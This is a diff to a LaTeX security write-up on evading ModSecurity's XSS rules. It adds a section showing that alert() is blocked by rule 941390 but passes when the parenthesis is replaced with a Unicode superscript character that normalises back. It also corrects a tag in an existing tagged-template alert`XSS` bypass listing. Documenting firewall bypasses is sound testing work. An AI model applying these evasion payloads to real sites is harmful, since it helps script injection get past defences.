@@ -26,6 +26,24 @@ Tests have shown that using Unicode encoding in JSON and substituting the \verb|
 \verb|Possible Unicode character bypass detected|.
 (see Listing~\ref{lst:jsonunicodetests})
 
+\subsubsection{Unicode Normalization}
+The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
+<payload>alert("normalizeMe")</payload>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+<message>"Javascript method detected"</message>
+\end{lstlisting}
+
+If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (U+207D), the payload bypasses the filter:
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('normalizeMe') bypass, label=lst:alertnormalizemebypass]
+<payload>alert("normalizeMe")</payload>
+<bypass>alert\u{207D}'normalizeMe')</bypass>
+\end{lstlisting}
+
+Calling \verb|.normalize('NFKD')| on the bypassed string: \verb|"alert\u{207D}'normalizeMe')".normalize('NFKD')| will convert the string to the original payload: \verb|"alert('normalizeMe')"|.
 
 \subsubsection{Percent encoding}
 The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules. (See Listing~\ref{lst:urlencodedexampleblocked})
@@ -44,7 +62,7 @@ After substituting the function call using \verb|('XSS')| with a Tagged Template
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
 <payload>alert("XSS")</payload>
-<bypass>alert`XSS`</payload>
+<bypass>alert`XSS`</bypass>
 \end{lstlisting}
 
 \subsection{JSFuck}
